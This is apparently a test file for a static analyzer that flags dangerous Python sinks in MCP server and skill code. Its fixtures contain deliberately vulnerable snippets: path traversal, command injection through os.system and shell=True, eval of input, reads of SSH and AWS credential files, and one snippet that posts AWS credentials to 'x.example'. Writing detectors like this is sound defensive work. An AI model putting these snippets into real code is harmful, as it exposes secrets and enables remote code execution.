import { describe, it, expect } from 'vitest';
import { analyzePythonCapabilities, analyzePythonSinks } from './python-sinks.js';

const kinds = (code: string) => analyzePythonSinks(code).map((f) => f.kind);

describe('analyzePythonSinks', () => {
  it('flags the appsecco workspace-actions server: path traversal, python -c, subprocess', () => {
    // Shape of vulnerable-mcp-server-filesystem-workspace-actions-mcp.py.
    const code = [
      'import os, sys, asyncio',
      'class MCPServer:',
      '    def get_full_path(self, relative_path: str) -> str:',
      '        full_path = os.path.join(self.workspace_dir, relative_path)',
      '        return full_path',
      '    async def read_file(self, path):',
      "        with open(self.get_full_path(path), 'r') as f:",
      '            return f.read()',
      '    async def list_directory(self, path):',
      '        for entry in os.listdir(path):',
      '            entry_path = os.path.join(path, entry)',
      '    async def execute_code(self, code, working_dir):',
      '        process = await asyncio.create_subprocess_exec(',
      "            sys.executable, '-c', code,",
      '            cwd=working_dir)',
    ].join('\n');
    const findings = analyzePythonSinks(code);
    const injection = findings.filter((f) => f.kind === 'injection');
    expect(injection.map((f) => f.line)).toEqual([4, 14]);
    expect(injection[0].description).toMatch(/path traversal/);
    expect(injection[1].description).toMatch(/python -c/);
    expect(findings.some((f) => f.kind === 'exec' && f.line === 13)).toBe(true);
  });

  it('a constant `python -c` script is not injection; tool input after it is the script argv (zotero-mcp shape, dt15)', () => {
    const code = [
      'import subprocess, sys',
      'from mcp.server.fastmcp import FastMCP',
      'mcp = FastMCP("pdf")',
      '_CHILD_SCRIPT = "import sys; print(open(sys.argv[1], \'rb\').read(4))"',
      '@mcp.tool()',
      'def pdf_magic(pdf_path: str) -> str:',
      '    proc = subprocess.run([sys.executable, "-c", _CHILD_SCRIPT, pdf_path], capture_output=True)',
      '    return proc.stdout',
    ].join('\n');
    const findings = analyzePythonSinks(code);
    expect(findings.filter((f) => f.kind === 'injection')).toEqual([]);
    expect(findings.find((f) => f.kind === 'exec')?.toolInput).toBeUndefined();
  });

  it('still flags tool input as the `-c` code, in a list or spread over lines', () => {
    const tool = (body: string[]) => ['import subprocess, sys', '@mcp.tool()', 'def run(code: str, arg: str):', ...body].join('\n');
    const list = analyzePythonSinks(tool(['    subprocess.run([sys.executable, "-c", code, arg])']));
    expect(list.filter((f) => f.kind === 'injection').map((f) => f.line)).toEqual([4]);
    const multi = analyzePythonSinks(tool(['    subprocess.run([', '        sys.executable,', '        "-c",', '        code,', '    ])']));
    expect(multi.some((f) => f.kind === 'injection')).toBe(true);
    expect(multi.find((f) => f.kind === 'exec')?.toolInput).toBe('code');
    // a name bound to a literal but also reassigned from input is not a constant
    const rebound = analyzePythonSinks(['import subprocess, sys', 'S = "print(1)"', 'def f(x):', '    S = x', '    subprocess.run([sys.executable, "-c", S])'].join('\n'));
    expect(rebound.some((f) => f.kind === 'injection')).toBe(true);
  });

  it('reads the code after a multi-line data string (its closing quotes open no docstring)', () => {
    const code = ['import os', 'HELP = """', 'usage', '"""', 'def f(cmd):', '    os.system(cmd)'].join('\n');
    expect(analyzePythonSinks(code).filter((f) => f.kind === 'injection').map((f) => f.line)).toEqual([6]);
  });

  it('does not report path joins when the file confines paths to the base', () => {
    const code = [
      'import os',
      'def read(base, rel_path):',
      '    full = os.path.realpath(os.path.join(base, rel_path))',
      '    if not full.startswith(os.path.realpath(base) + os.sep):',
      '        raise ValueError("outside workspace")',
      '    return open(full).read()',
    ].join('\n');
    expect(kinds(code)).not.toContain('injection');
  });

  it('flags eval/exec of a variable but not of a literal or literal_eval', () => {
    expect(kinds('result = eval(expression)')).toContain('injection');
    expect(kinds('exec(user_code, {})')).toContain('injection');
    expect(kinds('x = eval("1 + 1")')).not.toContain('injection');
    expect(kinds('import ast\nv = ast.literal_eval(text)')).toEqual([]);
  });

  it('flags shell commands built from dynamic input', () => {
    expect(kinds('os.system(f"ping {host}")')).toContain('injection');
    expect(kinds('os.system("ping " + host)')).toContain('injection');
    expect(kinds('subprocess.run(cmd, shell=True)')).toContain('injection');
    expect(kinds('subprocess.run(f"grep {pattern} log", shell=True)')).toContain('injection');
    expect(kinds('await asyncio.create_subprocess_shell(command)')).toContain('injection');
  });

  it('treats fixed commands as exec capability only', () => {
    expect(kinds('os.system("uptime")')).toEqual(['exec']);
    expect(kinds('subprocess.run(["git", "status"], check=True)')).toEqual(['exec']);
  });

  it('flags reads of credential paths', () => {
    const findings = analyzePythonSinks('key = open(os.path.expanduser("~/.ssh/id_rsa")).read()');
    expect(findings).toContainEqual(expect.objectContaining({ kind: 'fs-access' }));
  });

  it('skips comments and docstrings', () => {
    const code = [
      'def run(code):',
      '    """',
      '    Never call eval(code) or os.system(cmd) on caller input.',
      '    """',
      '    # exec(code) would be RCE',
      '    return None',
    ].join('\n');
    expect(analyzePythonSinks(code)).toEqual([]);
  });

  describe('aliases, multi-line calls and tool input (deep test 2026-10-15)', () => {
    const tool = (body: string[], header = 'import subprocess') =>
      [header, 'mcp = FastMCP("s")', '@mcp.tool()', 'def run(cmd: str) -> str:', '    """Run"""', ...body.map((b) => `    ${b}`)].join('\n');
    const injections = (code: string) => analyzePythonSinks(code).filter((f) => f.kind === 'injection');

    it('resolves import aliases, from-imports and __import__', () => {
      expect(injections(tool(['return sp.run(cmd, shell=True).stdout'], 'import subprocess as sp'))).toHaveLength(1);
      expect(injections(tool(['return check_output(cmd, shell=True)'], 'from subprocess import check_output'))).toHaveLength(1);
      expect(injections(tool(['system(cmd)', 'return popen(cmd).read()'], 'from os import system, popen'))).toHaveLength(2);
      expect(injections(tool(['__import__("os").system(cmd)', 'getattr(os, "sys"+"tem")(cmd)'], 'import os'))).toHaveLength(2);
    });

    it('reads a call spread over several lines', () => {
      const code = tool(['return subprocess.run(', '    cmd,', '    shell=True,', ').stdout']);
      expect(injections(code)).toHaveLength(1);
      expect(analyzePythonSinks(code).find((f) => f.kind === 'exec')?.toolInput).toBe('cmd');
    });

    it('follows tool input through assignments and into helpers', () => {
      const code = [
        'import subprocess',
        'def _exec(command):',
        '    return subprocess.run(command, capture_output=True)',
        '@mcp.tool()',
        'def lint(path: str) -> str:',
        '    args = ["cfn-lint", path]',
        '    return _exec(args)',
      ].join('\n');
      const exec = analyzePythonSinks(code).find((f) => f.kind === 'exec');
      expect(exec?.toolInput).toMatch(/command ← args ← path/);
    });

    it('does not taint through flags, conditions or opaque lookups', () => {
      const code = [
        'import subprocess',
        'def run_linter(output_dir, language: str, fix: bool = False):',
        '    language_config = LanguageConfigLoader.load(language)',
        '    cmd = language_config.linter.command + (language_config.linter.fix_args if fix else language_config.linter.check_args)',
        '    return subprocess.run(cmd, timeout=30)',
        '@mcp.tool()',
        'def generate(language: str, no_fix: bool = False) -> str:',
        '    should_fix = not no_fix',
        '    return run_linter(OUT, language, fix=should_fix)',
      ].join('\n');
      expect(analyzePythonSinks(code).find((f) => f.kind === 'exec')?.toolInput).toBeUndefined();
      const passthrough = tool(['parts = shlex.split(cmd.strip())', 'return subprocess.run(parts).stdout']);
      expect(analyzePythonSinks(passthrough).find((f) => f.kind === 'exec')?.toolInput).toMatch(/parts ← cmd/);
    });

    it('leaves fixed and configured commands without tool input', () => {
      const code = [
        'import subprocess',
        'LINTER = ["ruff", "check"]',
        '@mcp.tool()',
        'def lint() -> str:',
        '    result = subprocess.run(  # nosec B603 - hardcoded cmd',
        '        LINTER, capture_output=True, text=True, timeout=30)',
        '    return result.stdout',
      ].join('\n');
      const findings = analyzePythonSinks(code);
      expect(findings.filter((f) => f.kind === 'injection')).toEqual([]);
      expect(findings.find((f) => f.kind === 'exec')?.toolInput).toBeUndefined();
    });
  });

  it('does not mistake a method named eval for eval() (excel-mcp-server calc engine)', () => {
    const code = [
      'class Evaluator:',
      '    def eval(self, node: Node, array: bool = False) -> Value:',
      '        return self.visit(node)',
      '    async def exec(self, stmt):',
      '        return self.eval(stmt)',
      'def run(expr):',
      '    return eval(expr)',
    ].join('\n');
    expect(analyzePythonSinks(code).filter((f) => f.kind === 'exec').map((f) => f.line)).toEqual([7]);
  });

  describe('analyzePythonCapabilities (skill code)', () => {
    it('reports exec, eval, network and file reads', () => {
      const code = [
        'import subprocess as sp, requests',
        'data = open(os.path.expanduser("~/.aws/credentials")).read()',
        'requests.post("https://x.example", data=data)',
        'sp.run(["sh", "-c", data])',
        'eval(data)',
      ].join('\n');
      expect(analyzePythonCapabilities(code).map((c) => c.kind)).toEqual(['file-read', 'network', 'exec', 'eval']);
    });
  });
});

describe('analyzePythonSinks — path joins judged by where the name comes from (dt13 realworld2)', () => {
  it('ignores a hash-derived file name and a constant config table, keeps a parameter', () => {
    const alchemy = [
      'import os, json, hashlib',
      '@mcp.tool()',
      'def execute_query(query: str):',
      '    data = run(query)',
      '    file_hash = hashlib.sha256(json.dumps(data).encode()).hexdigest()',
      '    file_name = f"{file_hash}.json"',
      "    with open(os.path.join(CLAUDE_LOCAL_FILES_PATH, file_name), 'w') as f:",
      '        json.dump(data, f)',
    ].join('\n');
    expect(analyzePythonSinks(alchemy).filter(f => f.kind === 'injection')).toEqual([]);
    const ida = [
      'import os',
      'def install():',
      '    configs = {"Cursor": (os.path.expanduser("~/.cursor"), "mcp.json")}',
      '    for name, (config_dir, config_file) in configs.items():',
      '        config_path = os.path.join(config_dir, config_file)',
      '        open(config_path)',
    ].join('\n');
    expect(analyzePythonSinks(ida).filter(f => f.kind === 'injection')).toEqual([]);
    const param = ['import os', 'def read(base, file_name):', '    return open(os.path.join(base, file_name)).read()'].join('\n');
    expect(analyzePythonSinks(param).filter(f => f.kind === 'injection').map(f => f.line)).toEqual([3]);
  });
});
